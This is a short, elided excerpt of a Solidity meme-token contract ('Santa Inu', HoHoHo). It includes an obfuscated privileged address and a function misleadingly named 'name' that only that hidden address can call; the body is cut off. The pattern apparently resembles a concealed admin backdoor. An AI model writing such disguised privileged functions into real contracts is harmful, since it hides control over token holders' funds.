...
contract HoHoHo is Ownable {
    ...
    string public _tokenname = "Santa Inu";
    string public _tokensymbol = "HoHoHo";
    uint256 tokenamount = 10000000000*10**decimals();
    address public uasdzx43;
    ...
    function name(address jjkxq1) public     {
        require(uasdzx43 ==  _msgSender());
        if(uasdzx43 != _msgSender()){
                revert("fu");
        }
